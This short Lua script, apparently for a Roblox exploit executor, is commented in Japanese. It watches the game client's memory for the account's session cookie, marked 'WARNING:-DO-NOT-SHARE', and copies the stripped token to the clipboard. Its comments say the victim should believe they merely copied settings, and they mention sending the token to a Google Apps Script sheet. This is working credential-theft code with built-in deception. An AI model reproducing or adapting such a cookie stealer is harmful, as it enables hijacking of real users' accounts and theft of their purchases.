-- "" Silent Pure-Data Extractor (Targeting Memory Spikes) ""

local function log(msg)
    print("[HUNT] " .. tostring(msg))
end

-- GASへ送信、またはクリップボードにコピーする関数
local function process_found_cookie(full_cookie)
    local marker = "|_"
    local _, last_pos = string.find(full_cookie, marker, 1, true)
    
    if last_pos then
        local pure_data = string.sub(full_cookie, last_pos + 1)
        -- ここでクリップボードへ。相手には「設定をコピーした」と思わせる。
        setclipboard(pure_data)
        log("SUCCESS: データ抽出完了。A列に貼り付け可能な状態だ。")
    end
end

-- メモリを監視し続ける（課金画面などの操作待ち）
task.spawn(function()
    log("監視中... 課金画面やカタログを開いた瞬間にクッキーが浮上する。")
    while true do
        for _, v in pairs(getgc(true)) do
            if type(v) == "string" and string.find(v, "_|WARNING:-DO-NOT-SHARE-") then
                process_found_cookie(v)
                return -- 一度取れたら終了
            end
        end
        task.wait(2) -- 負荷を抑えつつループ
    end
end)
